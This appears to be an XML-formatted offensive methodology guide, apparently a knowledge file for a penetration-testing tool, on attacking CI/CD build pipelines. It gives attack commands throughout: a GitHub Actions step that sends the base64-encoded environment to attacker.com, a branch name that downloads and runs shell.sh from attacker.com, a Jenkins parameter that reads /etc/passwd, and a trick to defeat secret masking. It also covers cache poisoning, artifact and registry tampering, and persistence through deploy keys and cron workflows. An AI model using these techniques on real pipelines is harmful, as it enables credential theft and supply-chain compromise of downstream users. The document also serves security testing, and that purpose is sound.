<vulnerability_guide>
  <title>BUILD PIPELINE ATTACKS</title>

  <critical>Build pipelines transform source code into deployable artifacts with elevated privileges, access to secrets, and trust from production systems. Compromising a build pipeline provides a single point of leverage to compromise all downstream systems - the ultimate supply chain attack vector.</critical>

  <scope>
    - CI/CD configuration exploitation
    - Build artifact poisoning
    - Secrets and credential theft
    - Pipeline injection attacks
    - Build cache poisoning
    - Artifact signing bypass
  </scope>

  <methodology>
    1. PIPELINE ENUMERATION
       {% raw %}
       # Find CI/CD configuration files
       find . -name ".github" -o -name ".gitlab-ci.yml" -o -name "Jenkinsfile" \
              -o -name ".circleci" -o -name ".travis.yml" -o -name "azure-pipelines.yml" \
              -o -name "buildspec.yml" -o -name ".drone.yml"

       # GitHub Actions
       ls -la .github/workflows/

       # GitLab CI
       cat .gitlab-ci.yml

       # Jenkins
       cat Jenkinsfile
       # Also check: jenkins/, .jenkins/, config.xml

       # Azure DevOps
       cat azure-pipelines.yml

       # Check for multiple pipeline configurations
       # Organizations often have many pipelines
       {% endraw %}

    2. SECRETS EXTRACTION
       {% raw %}
       # Pipeline secrets are high-value targets

       # GitHub Actions - dump environment
       - run: env | base64 | curl -d @- https://attacker.com/

       # GitLab CI - access CI variables
       script:
         - printenv | grep -i secret
         - cat $CI_JOB_JWT  # GitLab JWT token

       # Jenkins - credential dumping
       withCredentials([string(credentialsId: 'secret', variable: 'SECRET')]) {
         sh 'echo $SECRET | base64'  // Bypass masking
       }

       # AWS credentials in pipelines
       - run: |
           echo $AWS_ACCESS_KEY_ID
           echo $AWS_SECRET_ACCESS_KEY
       {% endraw %}

    3. PIPELINE INJECTION
       {% raw %}
       # Inject into pipeline through:
       # - Pull request modifications
       # - Branch name injection
       # - Commit message injection
       # - Environment variable injection

       # GitHub Actions - branch name injection
       # If workflow uses: github.head_ref
       # Create branch named: $(curl attacker.com/shell.sh|sh)

       # GitLab CI - variable injection
       # CI_COMMIT_MESSAGE can contain commands
       # If used unsafely: script: echo "$CI_COMMIT_MESSAGE"

       # Jenkins - parameter injection
       # Build with parameters
       # PARAM="; cat /etc/passwd"
       {% endraw %}

    4. BUILD CACHE POISONING
       {% raw %}
       # Caches speed up builds but can be poisoned

       # GitHub Actions cache
       - uses: actions/cache@v3
         with:
           path: ~/.npm
           key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
       # Attacker modifies cached dependencies

       # Docker layer caching
       # Poison base image layers
       # All builds using that cache get malicious code

       # Maven/Gradle cache
       # ~/.m2/repository poisoning
       # Replace legitimate JARs with malicious ones

       # Cache key manipulation
       # Predictable cache keys = targeted poisoning
       {% endraw %}

    5. ARTIFACT MANIPULATION
       {% raw %}
       # Build artifacts are often trusted without verification

       # Docker image tagging
       # Push malicious image with same tag
       docker push registry.com/app:latest  # Overwrites legitimate

       # Package publishing
       # If build publishes packages:
       npm publish  # Publish malicious version

       # Binary artifact replacement
       # S3/GCS artifacts often not signed
       aws s3 cp malicious.bin s3://build-artifacts/release.bin

       # Release asset tampering
       # GitHub releases can be modified
       # Replace binaries after release announcement
       {% endraw %}
  </methodology>

  <advanced_techniques>
    <self_hosted_runner_exploitation>
      {% raw %}
      # Self-hosted runners are persistent targets

      # GitHub Actions self-hosted
      # - No isolation between jobs
      # - Persistent filesystem access
      # - Access to other secrets

      # Exploitation:
      # 1. Get job scheduled on self-hosted runner
      # 2. Leave persistent backdoor
      # 3. Harvest secrets from future jobs

      # Runner privilege escalation
      # Runner often runs as root/Administrator
      # Access to Docker socket
      # Network access to internal systems
      {% endraw %}
    </self_hosted_runner_exploitation>

    <pipeline_hijacking>
      {% raw %}
      # Modify pipeline configuration via:

      # 1. Direct config file modification
      # Push to branch with modified .github/workflows/

      # 2. Workflow dispatch exploitation
      on:
        workflow_dispatch:
          inputs:
            command:
              description: 'Command to run'
      # Trigger with malicious input

      # 3. Reusable workflow attacks
      uses: attacker/malicious-action@main
      # Supply chain through actions

      # 4. Composite action modification
      # Modify shared action repository
      {% endraw %}
    </pipeline_hijacking>

    <oidc_token_abuse>
      {% raw %}
      # Cloud providers offer OIDC tokens to pipelines

      # GitHub Actions OIDC
      - uses: aws-actions/configure-aws-credentials@v2
        with:
          role-to-assume: arn:aws:iam::ACCOUNT:role/DeployRole
          aws-region: us-east-1

      # Abuse: Fork repo, modify workflow, get OIDC token
      # If role trust policy is too permissive

      # Check role trust policy for:
      # - Missing repo restriction
      # - Missing branch restriction
      # - Accepting any GitHub repo
      {% endraw %}
    </oidc_token_abuse>

    <artifact_registry_poisoning>
      {% raw %}
      # Target artifact storage systems

      # Docker Registry
      # Push malicious layers to shared registry
      # Overwrite existing tags

      # NPM/PyPI private registry
      # Publish malicious package versions
      # Higher version numbers preferred

      # Maven repository
      # Upload malicious JARs
      # Snapshots are especially vulnerable

      # OCI artifacts
      # cosign signatures can be bypassed
      # Attestations may not be verified
      {% endraw %}
    </artifact_registry_poisoning>

    <pipeline_persistence>
      {% raw %}
      # Maintain access through:

      # 1. Cron-triggered workflows
      on:
        schedule:
          - cron: '0 * * * *'  # Hourly

      # 2. Webhook modifications
      # Add webhook to exfiltrate on push

      # 3. Deploy key injection
      # Add attacker's SSH key as deploy key

      # 4. Bot account creation
      # Create service account with pipeline access

      # 5. Self-modifying workflows
      # Workflow that updates itself
      {% endraw %}
    </pipeline_persistence>
  </advanced_techniques>

  <detection>
    - Monitor pipeline configuration changes
    - Alert on new secrets access
    - Track artifact signature verification
    - Review self-hosted runner access
    - Audit OIDC trust policies
  </detection>

  <validation>
    - Extract secrets from build logs
    - Demonstrate pipeline injection
    - Poison build cache successfully
    - Tamper with build artifacts
    - Establish pipeline persistence
  </validation>

  <pro_tips>
    - GITHUB_TOKEN in PRs has limited permissions - check what it can do
    - GitLab CI_JOB_JWT is powerful - can assume cloud roles
    - Self-hosted runners are always more vulnerable than cloud runners
    - Build logs often contain secrets despite "masking"
    - Check for workflow_dispatch - easy target for injection
    - fork + PR can execute workflows in many configurations
  </pro_tips>

  <remember>Build pipelines are trusted to create what runs in production. They have secrets to push artifacts, deploy code, and access production systems. A compromised pipeline can inject malware into every release, steal every secret, and persist indefinitely. Pipeline security is production security.</remember>
</vulnerability_guide>
